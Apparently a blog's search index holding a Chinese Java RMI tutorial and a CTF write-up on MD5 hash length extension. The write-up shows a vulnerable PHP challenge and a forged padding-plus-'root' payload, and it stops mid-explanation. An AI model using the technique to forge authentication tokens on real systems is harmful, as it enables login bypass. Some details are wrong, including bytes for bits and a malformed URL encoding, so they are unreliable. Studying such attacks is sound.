<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>JAVA RMI</title>
    <url>/2023/04/08/RMI/</url>
    <content><![CDATA[<h3 id="一、什么是-RMI"><a href="#一、什么是-RMI" class="headerlink" title="一、什么是 RMI"></a>一、什么是 RMI</h3><p>RMI是远程方法调用，RMI技术可以使一个java虚拟机中的对象去调用另一个java虚拟中的对象方法并获取调用结果。也就是说RMI实现了客户端调用服务端的对象方法像调用本地的对象方法。</p>
<h3 id="二、RMI原理分析"><a href="#二、RMI原理分析" class="headerlink" title="二、RMI原理分析"></a>二、RMI原理分析</h3><p>既然是解决远程调用的问题，那么肯定要有client(客户端)和服务端(server)，也就是方法的调用者和被调用者，从客户端-服务器模型来看，客户端程序之间调用服务端，两者之间是通过JRMP协议实现的。</p>
<p>这里简单了解一下JRMP协议，类似于HTTP协议，规定了客户端和服务端要满足的规范：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">JRMP（Java远程方法协议）可以定义为特定于Java的，基于流的协议，该协议查找并引用远程对象。它要求客户端和服务器都使用Java对象。它是线级协议，在RMI下和TCP / IP上运行。</span><br></pre></td></tr></table></figure></div>

<p>下面通过流程图去进行RMI原理的分析：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230331150932626-442742960.png"
                      alt="image-20230331150932629"
                ></p>
<p> RMI 客户端在调用远程方法时会先创建一个stub(sun.rmi.registry.RegistryImpl_Stub)也称为存根,Stub是RMI client的代理对象，Stub的主要功能是请求远程方法时构造一个信息块，然后通过RMI机制发送给客户端。</p>
<p>stub构造的信息块由几个部分组成：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.远程对象标识符</span><br><span class="line">2.调用的方法描述</span><br><span class="line">3.编组后的参数值</span><br></pre></td></tr></table></figure></div>

<p>Stub会Remote对象传递给客户端的远程引用层（java.rmi.server.RemoteRef）并创建远程调用对象（java.rmi.server.RemoteCall）</p>
<p>Remotecall会对RMI的服务名称和Remote进行序列化，然后通过Socket连接的方式传输到服务端的远程应用层</p>
<p>在上面我们看到client有一个stub构造信息块发送到服务端，那么在Skeleton就是在服务端接收这个信息的对象。</p>
<p>Skeleton在接收到client传递来的信息块后调用Remotecall反序列化RMI客户端传过来的序列化</p>
<p>然后Skeleton会处理客户端请求，调用相应服务端的对象进行调用，并将方法的返回值打包成响应消息并发送回客户端</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Skeleton 接收到客户端请求后，会调用远程对象方法并返回方法的执行结果。客户端不会直接访问远程对象，而是通过 Skeleton 间接访问远程对象。Skeleton 的作用是隐藏远程对象的实现细节，使客户端可以像调用本地对象一样调用远程对象。</span><br><span class="line">需要注意的是，当远程对象方法抛出异常时，Skeleton 会将异常打包成响应消息并发送回客户端。客户端需要处理这些异常，并根据需要采取相应的措施。</span><br></pre></td></tr></table></figure></div>

<h3 id="三、RMI代码实现"><a href="#三、RMI代码实现" class="headerlink" title="三、RMI代码实现"></a>三、RMI代码实现</h3><p>1、RMI服务端注册服务代码</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line">import java.rmi.registry.LocateRegistry;</span><br><span class="line"></span><br><span class="line">public class RMIServerTest &#123;</span><br><span class="line"></span><br><span class="line">    // RMI服务器IP地址</span><br><span class="line">    public static final String RMI_HOST = &quot;127.0.0.1&quot;;</span><br><span class="line"></span><br><span class="line">    // RMI服务端口</span><br><span class="line">    public static final int RMI_PORT = 9527;</span><br><span class="line"></span><br><span class="line">    // RMI服务名称</span><br><span class="line">    public static final String RMI_NAME = &quot;rmi://&quot; + RMI_HOST + &quot;:&quot; + RMI_PORT + &quot;/test&quot;;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 注册RMI端口</span><br><span class="line">            LocateRegistry.createRegistry(RMI_PORT);</span><br><span class="line"></span><br><span class="line">            // 绑定Remote对象</span><br><span class="line">            Naming.bind(RMI_NAME, new RMITestImpl());</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;RMI服务启动成功,服务地址:&quot; + RMI_NAME);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();//createRegistry() 或 bind() 方法抛出异常，则会在控制台上输出异常信息。</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>前几行代码定义了RMI服务的ip，端口以及名字</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LocateRegistry.createRegistry(RMI_PORT);</span><br></pre></td></tr></table></figure></div>

<p><code>LocateRegistry.createRegistry(RMI_PORT)</code> 是在 Java RMI 中创建 RMI 注册表的方法。它将在指定的 RMI 端口上启动 RMI 注册表，并返回一个对该注册表的远程引用。</p>
<p>在JAVA RMI中RMI注册表是一种服务，在 RMI 中，客户端必须知道远程对象的位置（主机名和端口号），才能与之通信。RMI 注册表提供了一种机制，使客户端可以通过名称查找远程对象，而不必知道其位置。</p>
<p>当你在 RMI 中启动一个远程对象时，你需要将其注册到 RMI  注册表中，以便客户端可以查找和访问它。这个注册代表着将远程对象绑定到一个名称上，这个名称可以被客户端用来查找远程对象。在 Java RMI  中，这个名称通常是一个字符串，被称为绑定名称 (binding name)。</p>
<p>当客户端需要访问远程对象时，它可以使用 RMI 注册表来查找该对象。客户端使用绑定名称向 RMI 注册表发出请求，RMI 注册表会返回绑定名称所对应的远程对象的引用。然后客户端可以使用该引用来调用远程对象的方法。</p>
<p>如果 RMI 注册表已经在指定的端口上运行，那么 <code>createRegistry()</code> 方法将不会创建新的注册表，而是返回对现有注册表的引用。如果你希望在另一个虚拟机上创建 RMI 注册表，可以使用 <code>LocateRegistry.getRegistry(host, port)</code> 方法来获取对远程 RMI 注册表的引用。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Naming.bind(RMI_NAME, new RMITestImpl());</span><br></pre></td></tr></table></figure></div>

<p><code>Naming.bind()</code> 是 Java RMI 中用于将远程对象绑定到指定名称的方法。具体来说，它会将指定的远程对象绑定到一个指定的名称上，并将这个名称注册到 RMI 注册表中。这个名称可以用来在客户端中查找远程对象。</p>
<p>使用 <code>Naming.bind()</code> 方法绑定远程对象时，需要指定一个 URL，该 URL 包含了 RMI 注册表的主机名、端口号和绑定名称。</p>
<p>代码运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230406172913133-1458454200.png"
                      alt="image-20230406172910934"
                ></p>
<p>2、RMITestImpl()类的实现</p>
<p>在javaRMI中如果想将一个对象作为远程对象暴露给客户端使用，这个对象必须要满足以下要求：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、实现一个远程接口(即扩展java.rmi,Remote接口)</span><br><span class="line">2、必须是可序列化(即实现java.serializable接口)</span><br><span class="line">3、必须扩展 UnicastRemoteObject 类或 Activatable 类之一。</span><br></pre></td></tr></table></figure></div>

<p><code>UnicastRemoteObject</code> 是一个抽象类，它实现了 <code>Remote</code> 接口，并提供了一些默认的远程方法实现。当一个类继承了 <code>UnicastRemoteObject</code> 类后，它就可以直接暴露为远程对象，客户端可以通过 RMI 协议访问这个对象。</p>
<p>RMITestImpl()类代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line">import java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line">public class RMITestImpl extends UnicastRemoteObject implements RMITestInterface &#123;</span><br><span class="line"></span><br><span class="line">    private static final long serialVersionUID = 1L;</span><br><span class="line"></span><br><span class="line">    protected RMITestImpl() throws RemoteException &#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * RMI测试方法</span><br><span class="line">     *</span><br><span class="line">     * @return 返回测试字符串</span><br><span class="line">     */</span><br><span class="line">    @Override</span><br><span class="line">    public String test() throws RemoteException &#123;</span><br><span class="line">        return &quot;Hello RMI~&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>远程接口RMITestInterface代码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Remote;</span><br><span class="line">import java.rmi.RemoteException;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * RMI测试接口</span><br><span class="line"> */</span><br><span class="line">public interface RMITestInterface extends Remote &#123;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * RMI测试方法</span><br><span class="line">     *</span><br><span class="line">     * @return 返回测试字符串</span><br><span class="line">     */</span><br><span class="line">    String test() throws RemoteException;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在RMITestImpl 这段代码中，定义了一个RMITestImpl类，并实现了一个RMITestInterface接口，这个类的作用是将test()方法暴露为远程方法，以便客户端可以通过RMI协议调用它。在这个类中我们重写了<code>RMITestInterface</code> 接口中的 <code>test()</code> 方法，该方法返回了一个字符串hello Rmi 。由于这个类继承了UnicastRemoteObject 因此它可以直接暴露为远程对象，客户端可以通过 RMI 协议访问它。</p>
<p>那么为什么要继承<code>UnicastRemoteObject</code> 类呢？</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">	1、这是因为 RMI 通过序列化和反序列化对象来进行远程通信。当客户端调用远程对象的方法时，它实际上是在向远程对象发送序列化后的方法调用请求。而远程对象接收到请求后，需要将序列化后的数据反序列化成方法调用，并执行这个方法。如果远程对象没有实现 UnicastRemoteObject 类，那么 RMI 将无法序列化和传输这个对象，也就无法将它暴露为远程对象。</span><br><span class="line">2、因此，为了让一个对象可以作为远程对象暴露给客户端使用，必须将它的类继承 UnicastRemoteObject 类，并实现一个远程接口。这样，RMI 就可以将这个对象序列化并传输到客户端，客户端就可以通过 RMI 协议访问这个对象了。</span><br><span class="line"></span><br><span class="line">3、UnicastRemoteObject 是一个抽象类，它实现了 Remote 接口，并提供了一些默认的远程方法实现。当一个类继承了 UnicastRemoteObject 类后，它就可以直接暴露为远程对象，客户端可以通过 RMI 协议访问这个对象。</span><br></pre></td></tr></table></figure></div>

<p>由上面我们可以知道</p>
<p>在 Java RMI 中，如果要将一个对象暴露为远程对象，这个对象必须实现一个远程接口。这个远程接口必须继承 <code>Remote</code> 接口，并且其中的所有方法都必须声明抛出 <code>RemoteException</code> 异常。这个远程接口定义了客户端可以通过 RMI 协议调用的方法。</p>
<p>在这个示例代码中，<code>RMITestImpl</code> 类实现了一个名为 <code>RMITestInterface</code> 的远程接口。这个接口中只有一个方法 <code>test()</code>，它声明了抛出 <code>RemoteException</code> 异常。由于 <code>RMITestImpl</code> 类实现了 <code>RMITestInterface</code> 接口，因此它必须实现 <code>test()</code> 方法，并且在方法声明中也必须声明抛出 <code>RemoteException</code> 异常。</p>
<p>3、客户端代码实现</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com.anbai.sec.rmi;</span><br><span class="line"></span><br><span class="line">import java.rmi.Naming;</span><br><span class="line"></span><br><span class="line">import static com.anbai.sec.rmi.RMIServerTest.RMI_NAME;</span><br><span class="line"></span><br><span class="line">public class RMIClientTest &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            // 查找远程RMI服务</span><br><span class="line">            RMITestInterface rt = (RMITestInterface) Naming.lookup(RMI_NAME);</span><br><span class="line"></span><br><span class="line">            // 调用远程接口RMITestInterface类的test方法</span><br><span class="line">            String result = rt.test();</span><br><span class="line"></span><br><span class="line">            // 输出RMI方法调用结果</span><br><span class="line">            System.out.println(result);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<ol>
<li>在 <code>RMIClientTest</code> 类中定义了一个 <code>main</code> 方法，用于启动客户端程序。</li>
<li>在 <code>main</code> 方法中，通过调用 <code>Naming.lookup</code> 方法查找指定名称的远程对象，该名称在常量 <code>RMI_NAME</code> 中定义。</li>
<li>通过将 <code>Naming.lookup</code> 方法的返回结果转换为 <code>RMITestInterface</code> 类型，获取了远程接口对象的引用 <code>rt</code>。</li>
<li>通过调用 <code>rt</code> 对象的 <code>test</code> 方法，执行了远程接口的方法调用。</li>
<li>将远程方法调用的返回值打印到控制台。</li>
<li>在代码中使用了 <code>try-catch</code> 语句来捕获可能发生的异常，比如在远程调用时可能发生的 <code>RemoteException</code> 异常等。</li>
</ol>
<p>代码运行：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230406172955540-213647078.png"
                      alt="image-20230406172954315"
                ></p>
<h3 id="四、关于RMI实现代码和RMI机制的对照。"><a href="#四、关于RMI实现代码和RMI机制的对照。" class="headerlink" title="四、关于RMI实现代码和RMI机制的对照。"></a>四、关于RMI实现代码和RMI机制的对照。</h3><p>通过上面的学习我们可以知道Skeleton是RMI 服务器端用于接收远程方法地调用请求并将其转发到相应远程对象地中间件，skeleton通过解组远程方法调用请求，调用相应地远程对象方法，然后将结果打包发送回客户端。</p>
<p>RMI 注册表是用于维护对象引用的中心存储库。客户端通过查找注册表来获取对远程对象的引用。在 RMI 服务器端，Skeleton 和注册表通常是一起使用的，以便为客户端提供完整的远程方法调用服务。</p>
<p>具体来说，当 RMI 服务器端接收到客户端的远程方法调用请求时，Skeleton  会解组该请求并确定调用哪个远程对象的方法。然后，Skeleton  会调用相应的远程对象方法，并将结果打包成一个响应并发送回客户端。在这个过程中，Skeleton 可能需要查找注册表来获取对远程对象的引用。</p>
<p>因此，可以说 Skeleton 和 RMI 注册表是 RMI 服务器端的两个核心组件，它们共同协作以提供完整的远程方法调用服务。</p>
<p>客户端通过 Stub 对象来调用远程对象的方法。在 Java RMI 中，Stub 是客户端用于调用远程方法的代理对象，它封装了与远程对象的通信细节，使得客户端可以像调用本地对象一样调用远程对象的方法。</p>
<p>当客户端需要调用远程对象的方法时，它会首先从 RMI 注册表中查找远程对象的引用。然后，客户端使用引用来获取远程对象的 Stub  对象。客户端使用 Stub 对象来调用远程对象的方法，就好像调用本地对象的方法一样。当客户端调用远程方法时，Stub  对象会将方法调用打包成一个请求并发送到 RMI 服务器端。RMI 服务器端接收到请求后，会使用 Skeleton  对象来解组请求并调用相应的远程对象方法，然后将结果打包成一个响应并发送回客户端。客户端接收到响应后，Stub  对象会将响应解包并返回给客户端调用方。</p>
]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>hash长度拓展攻击</title>
    <url>/2023/04/08/hashc%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h2 id="一、hash长度攻击的简要介绍"><a href="#一、hash长度攻击的简要介绍" class="headerlink" title="一、hash长度攻击的简要介绍"></a>一、hash长度攻击的简要介绍</h2><p>1、首先什么是hash长度拓展攻击？</p>
<p>简单来说，由于hash的生成机制原因，使得我们可以认为的在原先明文数据的基础上添加新的拓展字符，使得原本的加密链变长，进而控制加密链的最后一节，使得我们得以控制最终结果。</p>
<p>也就是说当我们知道hash(secret+data)的值以及secret的长度的情况下，我们就可以推算出hash(secret+data||padding||a）在这里padding是secret后面的填充内容，包含整个消息的长度，a可以是任何数据，我们需要知道secret的长度，这样才能够计算出padding。</p>
<p>2、什么是hash算法？</p>
<p>哈希算法（Hash算法）是一种将任意长度的消息压缩到固定长度的消息摘要的数学函数。哈希算法将输入消息（也称为明文）作为输入，并生成唯一的固定长度的输出，该输出称为哈希值，摘要或指纹。哈希值通常用于数字签名，数据完整性校验，数据索引和加密等安全应用中。常见的hash算法包括md5，sha-1，sha-256等。</p>
<h2 id="二、MD5算法的加密流程"><a href="#二、MD5算法的加密流程" class="headerlink" title="二、MD5算法的加密流程"></a>二、MD5算法的加密流程</h2><p>想要搞清楚hash长度拓展攻击的逻辑，就要先理清楚hash算法的加密流程。</p>
<p>这里以md5加密为例进行分析。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5的加密流程，大概分为以下几部分：</span><br><span class="line">1、填充消息</span><br><span class="line">2、添加长度信息</span><br><span class="line">3、初始化状态</span><br><span class="line">4、分组处理进行复杂函数处理</span><br><span class="line">5、输出结果</span><br></pre></td></tr></table></figure></div>

<p>下面我们大概分析一下每个步骤的过程：</p>
<p>1、填充消息</p>
<p>将原始消息（字节序列）填充到长度为448 mod 512的位置，使得填充后的消息长度为512的整数倍。填充方式为在原始消息末尾添加一个1，后面再补0直到长度满足要求。</p>
<p>也就是说当消息长度小于56个字节时要讲其填充到56个字节，大于等于56字节的要填充到对64取余的余数为8个字节.</p>
<p>如下图所示：</p>
<p>加入我们对，message进行填充：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225145219625-1440618184.png"
                      alt="image-20230225145218735"
                ></p>
<p>这里的80是16进制，其代表的是二进制下面的10000000，那么这里就是补一个1和若干0，把消息补位到56个字节，也就是448bit.</p>
<p>2、存储长度信息</p>
<p>上面补位后，上面消息长度以及达到了56字节，从第57字节开始存储补位之前消息的长度</p>
<p>长度是小端存储。也就是高字节存放在高地址</p>
<p>我们还以上面的例为例：</p>
<p>字符串message的长度为7个字母，也就是56byte 换算成16进制是0x38</p>
<p>即：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225150941043-1957370559.png"
                      alt="image-20230225150939934"
                ></p>
<p>3、初始化状态</p>
<p>md5使用四个32为寄存器（A,B,C,D）保存中间运算结果，初始值为常量，具体来说，A,B,C,D的初始值如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A = 0x67452301</span><br><span class="line">B = 0xEFCDAB89</span><br><span class="line">C = 0x98BADCFE</span><br><span class="line">D = 0x10325476</span><br></pre></td></tr></table></figure></div>

<p>4、分组处理进行复杂函数处理</p>
<p>将填充后的消息分为若干个512位的消息块。对于每个消息块，MD5算法执行四轮循环，每轮循环包含16次操作，共计64次操作。每次操作都使用一个消息块中的32位字作为输入，对寄存器A、B、C、D进行修改，最终输出新的A、B、C、D的值。</p>
<p>也就是说第一个数据块与初始向量进行四轮循环，生成第一个新的字符串，保存在寄存器A,B,C,D中，寄存器继续与第二个数据块进行运算，直到最后一个数据块。</p>
<p>其过程可以理解为：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230226120409339-1591078397.png"
                      alt="image-20230226120409357"
                ></p>
<p>5、结果的输出</p>
<p>假设最终生成的寄存器的值是：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A=0xab45bc01</span><br><span class="line">B=0x6a64bb53</span><br><span class="line">C=0x23ba8afe</span><br><span class="line">D=0x46847a62</span><br></pre></td></tr></table></figure></div>

<p>先两两一组进行组合，得到下面的数据</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ab 45 bc 01</span><br><span class="line">6a 64 bb 53</span><br><span class="line">23 ba 8a fe</span><br><span class="line">46 84 7a 62</span><br></pre></td></tr></table></figure></div>

<p>在进行高低位互换：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">01 bc 45 ab</span><br><span class="line">53 bb 64 6a</span><br></pre></td></tr></table></figure></div>

<p>最终拼接在一起就能够得到md5的值</p>
<p>这就是md5加密的大概过程</p>
<p>下面这是网上找来的流程图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225153857754-2115571783.png"
                      alt="image-20230225153856884"
                ></p>
<p>下面是我按自己的理解搞得一个流程图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230226120429029-1609748710.png"
                      alt="image-20230226120429193"
                ></p>
<h2 id="三、hash长度拓展攻击逻辑分析"><a href="#三、hash长度拓展攻击逻辑分析" class="headerlink" title="三、hash长度拓展攻击逻辑分析"></a>三、hash长度拓展攻击逻辑分析</h2><p>上面我们对md5的加密流程进行了大概的分析</p>
<p>下面我们通过md5的加密流程对hash长度拓展攻击逻辑进行分析</p>
<p>我们这里通过一道题目进行分析：</p>
<p>这是22年12月举办的铁三信息安全比赛的一道原题：</p>
<p>代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$text</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span> . <span class="variable">$text</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">encrypt</span>(<span class="variable">$user</span>) === <span class="variable">$_COOKIE</span>[<span class="string">&#x27;verify&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>, <span class="string">&#x27;root&#x27;</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$flag</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;not root！！！&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;verify&quot;</span>, <span class="title function_ invoke__">encrypt</span>(<span class="string">&quot;guest&quot;</span>), <span class="title function_ invoke__">time</span>() + <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>);</span><br><span class="line">    <span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;len&quot;</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$key</span>), <span class="title function_ invoke__">time</span>() + <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure></div>

<p>这里可以看到</p>
<p>获得flag的条件：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">encrypt</span>(<span class="variable">$user</span>) === <span class="variable">$_COOKIE</span>[<span class="string">&#x27;verify&#x27;</span>]) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>, <span class="string">&#x27;root&#x27;</span>))) &#123;</span><br></pre></td></tr></table></figure></div>

<p>我们输入的user经过md5加密后要与cookie里面的vefify相等，并且在输入的user里面要有root</p>
<p>看一下响应包：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225231719455-581312355.png"
                      alt="image-20230225231719067"
                ></p>
<p>可以得到hash(secert+guest)的值为382441859bb6709d0d9fa11ef3c255b9，secert的长度为13</p>
<p>那我们这里重复一下md5加密的流程：</p>
<p>首先是数据填充：（这里假设secret是13个A）</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225232048100-1772008931.png"
                      alt="image-20230225232048215"
                ></p>
<p>然后进行原始消息数据填充</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225232735328-883346498.png"
                      alt="image-20230225232735247"
                ></p>
<p>18个字符，144byte 转换为16进制表示为0x90</p>
<p>后面就是将填充后的消息分成若干个512位的位块，然后与初始向量进行四轮循环运算，这里不再详细讲，</p>
<p>直到最后一个数据块与寄存器中的向量值进行四轮损害运算，得到最终向量值(A’,B’,C’,D’),在经过高低位运算就可以得到最终的md5加密的hash值。</p>
<p>那么我们回到题目，通过响应包我们可以得到hash(secret+guest)的值382441859bb6709d0d9fa11ef3c255b9</p>
<p>那我们可以推出最后得到向量值为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A&#x27;=0x85412438</span><br><span class="line">B&#x27;=0x9d70b69b</span><br><span class="line">C&#x27;=0x1ea19f0d</span><br><span class="line">D&#x27;=0xb955c2f3</span><br></pre></td></tr></table></figure></div>

<p>题目要求要匹配到root，但是我们并不知道secret，所以这里可以使用hash长度拓展攻击</p>
<p>首先我们把要添加的数据添加上去</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225234731691-1474411680.png"
                      alt="image-20230225234731479"
                ></p>
<p>根据md5填充规则进行填充：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/2794407-20230225234847533-283931689.png"
                      alt="image-20230225234847560"
                ></p>
<p>去掉前面的我们假设的secret给去除掉，可以得到</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">guest\0x80\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00\0x00....\0x00\0x00\0x00\0x00\0x00\0x00\0x90\0x00\0x00\0x00\0x00\0x00\0x00\0x00root</span><br></pre></td></tr></table></figure></div>

<p>进行url编码：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">guest%00x80%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00..x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x00%00x90%00x00%00x00%00x00%00x00%00x00%00x00%00x00root</span><br></pre></td></tr></table></figure></div>

<p>这里我们虽然通过添加的方法使得字符串中有了root，但是由于我们并不知道secret，导致我们并没有办法计算出md5加密后hash值。但是由于我们实在hash(secret+guest)的hash值，但是我们这里填加了数据，所以导致还要再进行一轮运算，那么我们就可以再不知道secret的情况下计算出正确的md5加密的hash值。</p>
<p>这里我们上面计算出了最后一轮加密的向量值为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">A&#x27;=0x85412438</span><br><span class="line">B&#x27;=0x9d70b69b</span><br><span class="line">C&#x27;=0x1ea19f0d</span><br><span class="line">D&#x27;=0xb955c2f3</span><br></pre></td></tr></table></figure></div>

<p>由于我们添加了新的字符串，导致分组时分的数据块会增加，那么hash(secret+guest)的值并不是我们最终要得到的md5值，而是做完向量串继续与后面新增加的数据块进行运算，那么这样的话我们就可以再不知道secret的情况下获得md5加密的hash值。</p>
<p>但是这个计算式非常复杂的，我们这里使用找到的脚本进行计算：</p>
